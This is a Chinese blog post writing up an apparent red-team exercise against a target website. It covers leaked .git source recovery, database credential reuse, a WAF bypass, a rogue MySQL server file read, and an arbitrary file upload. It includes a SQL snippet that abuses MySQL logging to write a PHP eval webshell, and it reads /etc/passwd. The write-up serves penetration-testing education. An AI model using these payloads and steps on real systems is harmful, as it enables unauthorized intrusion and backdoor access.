<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>记一次攻防演习渗透过程 · Chen's Blog</title> <meta name="description" content="记一次攻防演习渗透过程"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2020-11-22/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">ᴀᴜᴛʜᴏʀ: ᴠᴜʟᴋᴇʏ_ᴄʜᴇɴ</h1> <div class="divider"></div> <center><a href="/about" target="_blank">ᴀʙᴏᴜᴛ</a> | <a href="/links" target="_blank">ʟɪɴᴋs</a> | <a href="/AssistTool" target="_blank">ᴀssɪsᴛ ᴛᴏᴏʟ</a> | <a href="/RGPerson" target="_blank">ʀɢᴘᴇʀsᴏɴ</a> | <a href="/Binary-Learning" target="_blank">ʙɪɴᴀʀʏ ʟᴇᴀʀɴɪɴɢ</a></center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">记一次攻防演习渗透过程</h1> <time class="code">November 22, 2020</time> </div> <div class="divider"></div> <h1 id="记一次攻防演习渗透过程">记一次攻防演习渗透过程</h1> <h2 id="前言">前言</h2> <p>记录一次攻防演习渗透过程，文章仅写关于「打点」环节的部分，也就是拿到靶标的Webshell为止。</p> <p>任务: 拿到XXX业务系统权限…</p> <h2 id="过程">过程</h2> <p>靶标是一个www的域名，简单看了下有机会硬啃（商业源码），但时间不多，先找找脆弱点，常规一套流程，收集子域、C段…</p> <h3 id="脆弱点发现">脆弱点发现</h3> <p>在对子域的常规扫描后，发现存在<code class="language-plaintext highlighter-rouge">.git</code>泄露:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054609733881.jpg" alt="-w494" /></p> <p>以及发现了<code class="language-plaintext highlighter-rouge">phpMyAdmin</code>应用和一些<code class="language-plaintext highlighter-rouge">phpinfo()</code>信息泄漏:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054610914733.jpg" alt="-w865" /></p> <p>看到这些，不由得兴奋了起来，接下来只要按照预期的想法: 通过<code class="language-plaintext highlighter-rouge">.git</code>拿到数据库账号密码（源码中一般会有），登录<code class="language-plaintext highlighter-rouge">phpMyAdmin</code>，然后拿到<code class="language-plaintext highlighter-rouge">Webshell</code>…</p> <p>但…转折点来了，尝试使用<code class="language-plaintext highlighter-rouge">GitHack</code>等一系列常见工具去恢复<code class="language-plaintext highlighter-rouge">.git</code>，发现恢复的文件只有一些图片，看<code class="language-plaintext highlighter-rouge">Logs</code>发现有很多文件恢复失败，既然不能当一个<code class="language-plaintext highlighter-rouge">ScriptKid</code>一把梭哈，那就自己来手动恢复吧~</p> <h3 id="git原理与恢复">Git原理与恢复</h3> <p><strong>基本概念</strong></p> <p>Git有三个概念词需要了解: 1.工作区 2.版本库 3.暂存区</p> <p>工作区就是正常的目录（你的项目位置）;版本库就是在工作区内的一个隐藏目录<code class="language-plaintext highlighter-rouge">.git</code>;如果你曾经注意过这个目录你会发现里面有许多东西，在该目录下会存在一个<code class="language-plaintext highlighter-rouge">index</code>文件，这被称之为暂存区。</p> <p>除以上所述之外，大家都知道每一个Git项目都会有一个默认的分支<code class="language-plaintext highlighter-rouge">master</code>，在<code class="language-plaintext highlighter-rouge">.git</code>目录下有一个文件<code class="language-plaintext highlighter-rouge">head</code>，它用来指向<code class="language-plaintext highlighter-rouge">master</code>这个分支。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054630957919.jpg" alt="-w992" /></p> <p>当我们使用<code class="language-plaintext highlighter-rouge">git add</code>时，实际上就是把文件添加进暂存区；使用<code class="language-plaintext highlighter-rouge">git commit</code>时，才会把暂存区的内容添加到当前分支，默认是<code class="language-plaintext highlighter-rouge">master</code>分支。</p> <p>我们可以来实际的看一下<code class="language-plaintext highlighter-rouge">index</code>和<code class="language-plaintext highlighter-rouge">head</code>这两个文件:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054636119175.jpg" alt="-w1108" /></p> <p>使用<code class="language-plaintext highlighter-rouge">Binwalk</code>直接分析，可以很直观的看见<code class="language-plaintext highlighter-rouge">index</code>内有许多内容，<code class="language-plaintext highlighter-rouge">head</code>并没有，直接<code class="language-plaintext highlighter-rouge">cat head</code>发现这就是一个单纯的文本内容:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ref: refs/heads/master
</code></pre></div></div> <p>前面了解到这是一个分支指向，那我直接查看<code class="language-plaintext highlighter-rouge">.git</code>目录下的<code class="language-plaintext highlighter-rouge">refs/heads/master</code>文件，得到一串Hash值。</p> <p>我们可以暂且认为这是<code class="language-plaintext highlighter-rouge">master</code>分支的一个记录，用于区分、比较。</p> <p>大概了解了以上内容后，还需要了解有哪些文件才能够恢复<code class="language-plaintext highlighter-rouge">.git</code>?</p> <p>首先我们来看一下<code class="language-plaintext highlighter-rouge">.git</code>目录内的一般结构:</p> <table> <thead> <tr> <th>名称</th> <th>类型</th> <th>作用</th> </tr> </thead> <tbody> <tr> <td>.git/index</td> <td>文件</td> <td>暂存区</td> </tr> <tr> <td>.git/config</td> <td>文件</td> <td>Git配置文件</td> </tr> <tr> <td>.git/description</td> <td>文件</td> <td>GitWeb专用的描述文件</td> </tr> <tr> <td>.git/info</td> <td>文件夹</td> <td>里面就一个exclude文件（与.gitignore互补），排除指定文件不用做Git提交</td> </tr> <tr> <td>.git/hooks</td> <td>文件夹</td> <td>存放一些钩子脚本</td> </tr> <tr> <td>.git/HEAD</td> <td>文件</td> <td>记录分支</td> </tr> <tr> <td>.git/objects</td> <td>文件夹</td> <td>存放所有数据</td> </tr> <tr> <td>.git/refs</td> <td>文件夹</td> <td>存放提交对象的指针</td> </tr> </tbody> </table> <p>知道结构及其作用后，挑重点关注<code class="language-plaintext highlighter-rouge">objects</code>这个目录，但一看，全都是一些Hash命名的文件，根本不知道其对应关系:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054656504449.jpg" alt="-w1102" /></p> <p>并且这些文件都没办法看:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054659230739.jpg" alt="-w822" /></p> <p>查阅相关资料得知此类文件是将原文件内容经过<code class="language-plaintext highlighter-rouge">zlib</code>的<code class="language-plaintext highlighter-rouge">deflate</code>压缩后存储的( https://mirrors.edge.kernel.org/pub/software/scm/git/docs/user-manual.html#object-details ):</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054659652391.jpg" alt="-w1145" /></p> <p>而使用<code class="language-plaintext highlighter-rouge">zlib</code>进行解压查看文件内容时是这样的:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054674810483.jpg" alt="-w1222" /></p> <p>这个文件更像是记录了一个目录结构，而关于此就又需要查阅资料了，具体请看: https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-Git-%E5%AF%B9%E8%B1%A1</p> <p>git中的对象(<strong>对象对应文件</strong>)<code class="language-plaintext highlighter-rouge">.git/objects</code>包含了:</p> <ol> <li>SHA(所有用来表示项目历史信息的文件,是通过一个40个字符的（40-digit）“对象名”来索引的)</li> <li>Blob对象(用来存储文件的内容)</li> <li>Tree对象(有一串bunch指向Blob对象或是其它Tree对象的指针，一般表示内容之间的目录层次关系)</li> <li>Commit对象(指向一个Tree对象, 并且带有相关的描述信息.)</li> </ol> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059691330110.jpg" alt="-w481" /> (注: 图片来自 git-scm.com )</p> <p><strong>猜测</strong>: 按照这个逻辑，我们需要先获取<code class="language-plaintext highlighter-rouge">Commit</code>对象对应文件找到<code class="language-plaintext highlighter-rouge">Tree</code>对象对应文件再通过其获得<code class="language-plaintext highlighter-rouge">Blob</code>对象对应文件，最后解压即可获得源文件内容。</p> <p>那这些对象内容都存储在哪里呢？通过之前使用<code class="language-plaintext highlighter-rouge">Binwalk</code>分析，显而易见，在<code class="language-plaintext highlighter-rouge">.git/index</code>文件中。</p> <p>但是在这里<code class="language-plaintext highlighter-rouge">.git/index</code>文件无法直接查看，直接套用<code class="language-plaintext highlighter-rouge">GitHack</code>的( https://github.com/lijiejie/GitHack/blob/master/lib/parser.py )解析代码就行:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059735242568.jpg" alt="-w716" /></p> <p>获得SHA1: <code class="language-plaintext highlighter-rouge">a797b1973fd62dc34a691c7fe3bce33a504f2b74</code>，但是找了半天没找到这个对应文件​，后来尝试搜索前几位和后几位，发现搜索到了后几位:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059737421527.jpg" alt="-w664" /></p> <p>对比发现文件名和获取的SHA1值少了2位:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059738182126.jpg" alt="-w387" /></p> <p>搜索发现原来前两位是作为了目录名:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059738625732.jpg" alt="-w556" /></p> <p>但在这里，我们使用<code class="language-plaintext highlighter-rouge">zlib</code>去解压缩，发现存储在<code class="language-plaintext highlighter-rouge">.git/index</code>的SHA1值实际上就是一个<code class="language-plaintext highlighter-rouge">blob</code>对象的值，也就根本不需要获取<code class="language-plaintext highlighter-rouge">commit</code>、<code class="language-plaintext highlighter-rouge">tree</code>对象的值了，表示之前的顺序逆推逻辑是错误的:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059739165413.jpg" alt="-w746" /></p> <p>接下来按照这个思路去编写脚本恢复源码即可。</p> <p><strong>编写与恢复</strong></p> <p>由于项目时间原因简单了解原理之后，没有过多的去研究，也不打算使用原生方法去恢复，还是采用最暴力的方法，使用命令行去恢复<code class="language-plaintext highlighter-rouge">.git</code>，想要让Git回退历史，使用<code class="language-plaintext highlighter-rouge">git reset --hard commit_id</code>命令，进行版本回退。</p> <p>基于这个命令，我需要获取网站的这几个文件/目录:</p> <ol> <li><code class="language-plaintext highlighter-rouge">.git/index</code></li> <li><code class="language-plaintext highlighter-rouge">.git/logs</code></li> <li><code class="language-plaintext highlighter-rouge">.git/head</code></li> <li><code class="language-plaintext highlighter-rouge">.git/objects</code></li> <li><code class="language-plaintext highlighter-rouge">.git/refs</code></li> </ol> <p>先下载<code class="language-plaintext highlighter-rouge">.git/index</code>、<code class="language-plaintext highlighter-rouge">.git/head</code>、<code class="language-plaintext highlighter-rouge">.git/refs</code>、<code class="language-plaintext highlighter-rouge">.git/logs</code>(文件目录都是固定的无需考虑其他情况)而后解析<code class="language-plaintext highlighter-rouge">index</code>获取索引，根据索引依次下载<code class="language-plaintext highlighter-rouge">.git/objects</code>内的文件，最后全部下载完毕，获取<code class="language-plaintext highlighter-rouge">master</code>分支(<code class="language-plaintext highlighter-rouge">refs/heads/master</code>文件)对应的值带入该命令<code class="language-plaintext highlighter-rouge">git reset --hard commit_id</code>即可恢复:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054710482497.jpg" alt="-w793" /></p> <p>但发现除此之外，发现恢复的文件寥寥无几，后来下载<code class="language-plaintext highlighter-rouge">.git/logs/head</code>发现该<code class="language-plaintext highlighter-rouge">.git</code>项目还有其他分支:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059680019130.jpeg" alt="-w742" /></p> <p>这个记录中有两个SHA1的值，<code class="language-plaintext highlighter-rouge">master</code>对应前者，<code class="language-plaintext highlighter-rouge">shop</code>对应后者，简单修改命令<code class="language-plaintext highlighter-rouge">git reset --hard shop_commit_id</code>，还是那一套流程，恢复<code class="language-plaintext highlighter-rouge">shop</code>这个分支的源码即可。</p> <h3 id="获取子域-webshell">获取子域 Webshell</h3> <p>获得源码之后翻数据库账号密码:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054714423847.jpg" alt="-w307" /></p> <p>由于之前我们已经有了一个<code class="language-plaintext highlighter-rouge">phpinfo()</code>探针，网站绝对路径已知，所以直接上<code class="language-plaintext highlighter-rouge">phpMyAdmin</code>登录，尝试使用<code class="language-plaintext highlighter-rouge">into outfile</code>，有<code class="language-plaintext highlighter-rouge">--secure-file-priv</code>限制无法写入:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054716403383.jpg" alt="-w767" /></p> <p>转而使用Mysql Log日志存储的方式进行写入:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">set</span> <span class="k">global</span> <span class="n">general_log</span><span class="o">=</span><span class="k">on</span><span class="p">;</span>
<span class="k">set</span> <span class="n">global_log_file</span><span class="o">=</span><span class="s1">'/xxx/www/xxx.php'</span><span class="p">;</span>
<span class="k">select</span> <span class="s1">'&lt;?php @eval($_REQUEST["xxx"]);?&gt;'</span><span class="p">;</span>
</code></pre></div></div> <p>访问相关文件却提示我无法访问(<strong>403/AccessDefined</strong>):</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054717903557.jpg" alt="" /></p> <p>遇到这种情况尝试以下几种方法:</p> <ol> <li>修改后缀访问，判断是否是只针对脚本后缀进行限制（上传.htaccess文件）</li> <li>修改内容访问，判断是否有安全防护对内容进行限制</li> <li>如若以上均未访问成功，则可以考虑覆盖原文件写入</li> </ol> <p>这里我的情况是第三种，大概推测可能是因为新建的文件没有执行权限所导致，因为这里我们已经有源码了所以可以直接找已有的文件(<strong>建议选择非业务相关的文件</strong>)进行写入(<strong>记得事后恢复</strong>):</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054723563640.jpg" alt="-w562" /></p> <p>执行<code class="language-plaintext highlighter-rouge">phpinfo();</code>函数可以，但无法直接使用管理工具连接，抓包发现目标网站上了云WAF，对请求内容拦截了(该WAF还挺弱)，这种情况还是有很多中方式:</p> <ol> <li>配合Cknife、蚁剑等自定义修改传输内容(Base64编码等等)，但需要修改PHP文件内容配合解码</li> <li>直接上冰蝎、哥斯拉的马就行了</li> </ol> <p>为图方便，选择<code class="language-plaintext highlighter-rouge">冰蝎3</code>，使用<code class="language-plaintext highlighter-rouge">file_put_contents</code>写入连接就行(这都不拦，WAF堪忧):</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054723222387.jpg" alt="-w362" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054724217021.jpg" alt="-w699" /></p> <h3 id="瞄准靶标">瞄准靶标</h3> <p>进入子域的Webshell发现内网无机器、就是一个云服务器，一开始误以为打中靶标，因为在主战发现一个路径泄漏:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059692424662.jpg" alt="-w503" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059693308877.jpg" alt="-w170" /></p> <p>而子域服务器上也有对应目录并且文件一模一样，但是修改文件却没反应不生效，猜测很有可能主战业务曾经在这个子域服务器上，但后期进行了转移，原Web文件还留着。</p> <p>尝试翻翻源码，找密码，后来找到了几个有用的东西:1.Adminer文件 2.数据配置信息</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059695408421.jpg" alt="-w500" /></p> <p><code class="language-plaintext highlighter-rouge">Adminer</code>（类似phpMyAdmin的数据库管理工具）文件是随机的: <code class="language-plaintext highlighter-rouge">adminerxxxxxxxxx.php</code>，完全无法扫到，数据库配置密码与子域完全一样。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059702838497.jpg" alt="-w626" /></p> <p>使用数据配置密码无法登录，但是这里<code class="language-plaintext highlighter-rouge">Adminer</code>可以直接连外网的<code class="language-plaintext highlighter-rouge">Mysql</code>数据库，使用脚本( https://github.com/Gifts/Rogue-MySql-Server )伪造一个Mysql服务端读取对应文件就好，这边以<code class="language-plaintext highlighter-rouge">/etc/passwd</code>为例:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059704881880.jpg" alt="-w599" /></p> <p>如上图所示是成功读取到的，而我们在子域上也知道了对应的配置文件路径，直接伪造读取即可。</p> <p>再使用Adminer登录进去时，使用如下几种方法尝试获取Webshell:</p> <ol> <li>into outfile -&gt; 失败</li> <li>Mysql log -&gt; 失败</li> <li>Adminer是最新版本无漏洞 -&gt; 失败</li> <li>获取管理员密码无法解密 -&gt; 失败</li> </ol> <p>最终选择添加新管理员登录:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059709196188.jpg" alt="-w592" /></p> <p>登录之后寻找对应上传点(以最短攻击路径的方式进行GetWebShell):</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059709890399.jpg" alt="-w551" /></p> <p>测试如下后缀及服务器结果:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Key.jpg -&gt; 上传成功
Key.php -&gt; 上传失败WAF拦截
Key.phtml -&gt; 上传失败文件类型不允许
</code></pre></div></div> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059713996506.jpg" alt="-w474" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059714116942.jpg" alt="-w356" /></p> <p>我们在已经有源码的情况下，找到对应的代码进行审计就行，发现这里是白名单设置无法绕过:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059714739649.jpg" alt="" /></p> <p>直接关键词寻找上传功能，发现函数:<code class="language-plaintext highlighter-rouge">xxx_upload_file</code>存在任意文件上传</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059715071352.jpg" alt="" /></p> <p>后续构建请求包以及使用回车直接绕过<code class="language-plaintext highlighter-rouge">CloudWAF</code>，上传成功:</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059715574505.jpg" alt="" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059716055507.jpg" alt="-w436" /></p> <p>至此靶标拿到，结束。</p> <h1 id="文末">文末</h1> <p>很多时候还是需要去探寻事物的本质和原理，才能更加清晰明了的了解这个事物，否则什么东西都是现有的成品一把梭，遇到梭不了，容易出现惯性思维，可能就直接略过了。</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2021-05-05/1" title="NEXT: 某VPN客户端远程下载文件执行模拟逆向分析">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2020-09-03/4" title="PREV: 某终端检测响应平台代码审计挖掘（RCE）">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
